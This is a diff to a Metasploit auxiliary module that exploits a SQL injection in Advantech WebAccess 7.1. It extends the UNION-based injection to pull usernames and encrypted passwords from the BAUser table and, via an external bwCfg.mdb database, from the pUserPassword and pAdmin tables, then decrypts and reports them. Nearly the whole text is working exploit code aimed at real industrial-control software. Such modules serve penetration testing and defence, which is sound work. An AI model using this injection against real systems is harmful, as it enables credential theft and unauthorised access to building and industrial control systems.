@@ -18,8 +18,8 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
         vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
-        requests to the ChartThemeConfig web service. This module can be used to extract the BEMS
-        site usernames and hashes.
+        requests to the ChartThemeConfig web service. This module can be used to extract the site
+        and projects usernames and hashes.
       },
       'References'     =>
         [
@@ -40,7 +40,8 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS'])
+        OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS']),
+        OptString.new("WEB_DATABASE", [true, 'The path to the bwCfg.mdb database in the target', "C:\\WebAccess\\Node\\config\\bwCfg.mdb"])
       ], self.class)
   end
 
@@ -98,7 +99,7 @@ class Metasploit3 < Msf::Auxiliary
     Msf::Exploit::CheckCode::Vulnerable
   end
 
-  def parse_users(xml, mark)
+  def parse_users(xml, mark, separator)
     doc = Document.new(xml)
 
     strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string").map(&:text)
@@ -111,13 +112,7 @@ class Metasploit3 < Msf::Auxiliary
     i = 0
     strings.each do |result|
       next if result == mark
-      if i < (strings_length / 3)
-        @users.push(result)
-      elsif i < (strings_length / 3) * 2
-        @enc_passwords.push(result)
-      else
-        @keys.push(result)
-      end
+      @users << result.split(separator)
       i = i + 1
     end
 
@@ -127,13 +122,14 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{peer} - Exploiting sqli to extract users information...")
     mark = Rex::Text.rand_text_alpha(8 + rand(5))
     rand = Rex::Text.rand_text_numeric(2)
+    separator = Rex::Text.rand_text_alpha(5 + rand(5))
     # While installing I can only configure an Access backend, but
     # according to documentation other backends are supported. This
     # injection should be compatible, hopefully, with most backends.
     injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
-    injection << "union all select UserName from BAUser where #{rand}=#{rand} "
-    injection << "union all select Password from BAUser where #{rand}=#{rand} "
-    injection << "union all select Password2 from BAUser where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from BAUser where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from pUserPassword IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from pAdmin IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
     injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
     data = do_sqli(injection, mark)
 
@@ -143,12 +139,10 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     @users = []
-    @enc_passwords = []
-    @keys = []
     @plain_passwords = []
 
     print_status("#{peer} - Parsing extracted data...")
-    parse_users(data, mark)
+    parse_users(data, mark, separator)
 
     if @users.empty?
       print_error("#{peer} - Users not found")
@@ -166,7 +160,7 @@ class Metasploit3 < Msf::Auxiliary
     for i in 0..@users.length - 1
       @plain_passwords[i] =
           begin
-            decrypt_password(@enc_passwords[i], @keys[i])
+            decrypt_password(@users[i][1], @users[i][2])
           rescue
             "(format not recognized)"
           end
@@ -184,13 +178,13 @@ class Metasploit3 < Msf::Auxiliary
       report_auth_info({
        :host => rhost,
        :port => rport,
-       :user => @users[i],
+       :user => @users[i][0],
        :pass => @plain_passwords[i],
        :type => "password",
        :sname => (ssl ? "https" : "http"),
-       :proof => "Leaked encrypted password: #{@enc_passwords[i]}:#{@keys[i]}"
+       :proof => "Leaked encrypted password: #{@users[i][1]}:#{@users[i][2]}"
       })
-      users_table << [@users[i], @enc_passwords[i], @keys[i], @plain_passwords[i]]
+      users_table << [@users[i][0], @users[i][1], @users[i][2], @plain_passwords[i]]
     end
 
     print_line(users_table.to_s)
